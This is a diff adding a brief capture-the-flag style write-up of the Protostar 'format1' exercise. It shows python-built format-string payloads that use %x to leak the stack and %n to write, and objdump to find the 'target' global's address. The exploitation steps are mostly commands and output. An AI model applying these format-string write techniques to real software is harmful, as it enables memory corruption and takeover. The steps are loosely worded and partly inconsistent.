@@ -1,0 +1,35 @@
+Success
+=======
+
+using obdump I was easily able to find 'target' variable. Global variables
+are stored in .bss.
+
+1. Found vulnerability
+
+./format1 AAAA%x
+
+2. Locate user input
+
+user@protostar:/opt/protostar/bin$ ./format1 "`python -c 'print "AAAA" + "BBBB" + "%x " * 130 + "%x "'`"
+
+3. Overwrite last format specifier with arbitrary user input.
+
+./format1 "`python -c 'print "AAAA" + "BBBB" + "%x " * 128 + "%n "'`"
+
+...2e0000 6d726f66 317461 41414141 user@protostar:/opt/protostar/bin$
+
+4. Inject Shellcode. Inject return address of "int target" global variable.
+
+user@protostar:/opt/protostar/bin$ objdump -t format1 | grep target
+08049638 g     O .bss	00000004              target
+
+./format1 "`python -c 'print "\x38\x96\x04\x08" + "BBBB" + "%x " * 128 + "%x "'`
+"
+
+
+notes
+-----
+
+Locate the 'target' variable easily with objdump, gdb. 
+This is possible due to, .bss. This section of code stores the 
+Global Variables.
